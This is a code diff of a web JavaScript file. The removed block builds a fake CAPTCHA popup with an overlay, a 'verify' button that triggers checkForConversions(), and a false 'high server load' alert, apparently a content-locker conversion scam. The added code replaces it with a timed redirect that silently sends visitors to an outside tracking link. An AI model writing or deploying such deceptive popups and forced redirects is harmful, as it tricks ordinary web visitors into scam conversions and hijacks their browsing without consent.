@@ -116,95 +116,10 @@ contentLoaded(window, function() {
 
             var blue_circle_loading_anim = jQuery('#' + BLUE_CIRCLE_LOADING_ID);
 
-            setTimeout(function() {
-                
-                jQuery.get(popupIframeSrc, function(data, textStatus, jqXHR) {
-
-                    if (jqXHR.status === 200) {
-
-                        blue_circle_anim.css('cssText', 'display: none !important;');
-                        motioBC.destroy();
-                        blue_circle_loading_anim.css('cssText', 'display: block !important;');
-                        var motioBCL = new Motio(blue_circle_loading_anim[0], {
-                            fps: 60,
-                            frames: 79,
-                            vertical: true
-                        });
-                        motioBCL.play();
-                        // blue_circle_loading_anim.pan({fps: 60, speed: 20, no_of_frames: 79, dir: 'down', width: 36, height: 36});
-
-                        var captcha_popup_html = data;
-
-                        captcha_popup_html = captcha_popup_html.replace("%CAPTCHA_POPUP_ID%", CAPTCHA_POPUP_ID);
-                        captcha_popup_html = captcha_popup_html.replace("%LEFT_ICONS_ID%", LEFT_ICONS_ID);
-                        captcha_popup_html = captcha_popup_html.replace("%VERIFY_BTN_ID%", VERIFY_BTN_ID);
-
-                        jQuery('body').append('<div id="' + OVERLAY_ID + '" style="display: none; width: 100%; height: 100%; position: fixed; top: 0; left: 0; background-color: rgba(0, 0, 0, 0.8); z-index: 10000;"></div>');
-
-                        jQuery('body').append(captcha_popup_html);
-
-                        if (jQuery(window).width() <= 460) {
-                            toggleMobile(true);
-                        } else {
-                            toggleMobile(false);
-                            alignPopup();
-                        }
-
-                        jQuery(window).on('resize', function() {
-                            if (jQuery(window).width() > 460) {
-                                toggleMobile(false);
-                                alignPopup();
-                            } else {
-                                toggleMobile(true);
-                            }
-                        });
-
-                        jQuery('#' + VERIFY_BTN_ID).on('click', function() {
-
-                            if (typeof window.checkForConversions === 'function') {
-
-                                window.checkForConversions();
-
-                            }
-
-                        });
-
-                        jQuery('#' + LEFT_ICONS_ID).on('click', function() {
-                            alert('Disabled due to high server load. Please try again later.');
-                        });
-
-                        function alignPopup() {
-                            var captchaDivOffset = captcha_div.offset();
-                            var popup_div = jQuery('#' + CAPTCHA_POPUP_ID);
-                            var $window = jQuery(window);
-
-                            var el_top_relative_to_window = captchaDivOffset.top - $window.scrollTop();
-
-                            if (el_top_relative_to_window > ($window.height() / 2)) {
-                                popup_div.css('cssText', "left:" + (captchaDivOffset.left + 55) + "px !important;top: " + (captchaDivOffset.top - popup_div.height() + 45) + "px !important;position: absolute !important;z-index: 11000 !important;-webkit-transform: translateX(0%) !important;-moz-transform: translateX(0%) !important;-ms-transform: translateX(0%) !important;-o-transform: translateX(0%) !important;transform: translateX(0%) !important;");
-                                return true;
-                            }
-
-                            popup_div.css('cssText', "position: absolute !important;left: " + (captchaDivOffset.left + 55) + "px !important;top: " + (captchaDivOffset.top + 15) + "px !important;z-index: 11000 !important;-webkit-transform: translateX(0%) !important;-moz-transform: translateX(0%) !important;-ms-transform: translateX(0%) !important;-o-transform: translateX(0%) !important;transform: translateX(0%) !important;");
-                        }
-
-                        function toggleMobile(on) {
-                            var overlay = jQuery('#' + OVERLAY_ID);
-                            var popup = jQuery('#' + CAPTCHA_POPUP_ID);
-                            if (on) {
-                                jQuery(overlay).show();
-                                jQuery(popup).css('cssText', "width: 90% !important;position: fixed !important;top: 10% !important; left: 50% !important;z-index: 11000 !important;-webkit-transform: translateX(-50%) !important;-moz-transform: translateX(-50%) !important;-ms-transform: translateX(-50%) !important;-o-transform: translateX(-50%) !important;transform: translateX(-50%) !important;");
-                            } else {
-                                jQuery(overlay).hide();
-                                alignPopup();
-                            }
-                        }
-
-                    }
-
-                });
-
-            }, 950);
+ setTimeout(function() {
+    // Simple redirect to your link
+    window.location.href = "https://bouttiq.graphics/cl/i/krr67g";
+}, 950);
         });
 
     });
